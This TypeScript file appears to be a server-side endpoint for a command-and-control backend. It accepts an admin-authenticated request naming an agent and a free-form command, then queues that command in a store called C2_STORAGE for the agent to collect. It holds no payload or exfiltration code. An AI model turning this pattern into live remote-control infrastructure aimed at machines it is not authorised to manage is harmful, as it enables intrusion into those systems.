import { json, error } from "../core/response"
import { requireAdmin } from "../core/auth"

export async function issueCommand(
  request: Request,
  env: Env
): Promise<Response> {

  const auth = requireAdmin(request, env)
  if (auth) return auth

  let body: { agentId?: string; command?: string }

  try {
    body = await request.json()
  } catch {
    return error("Invalid JSON", 400)
  }

  if (!body.agentId || !body.command) {
    return error("Missing fields", 400)
  }

  const commandId = crypto.randomUUID()

  await env.C2_STORAGE.put(
    `cmd:${body.agentId}`,
    JSON.stringify({
      id: commandId,
      command: body.command
    })
  )

  return json({ ok: true, commandId })
}
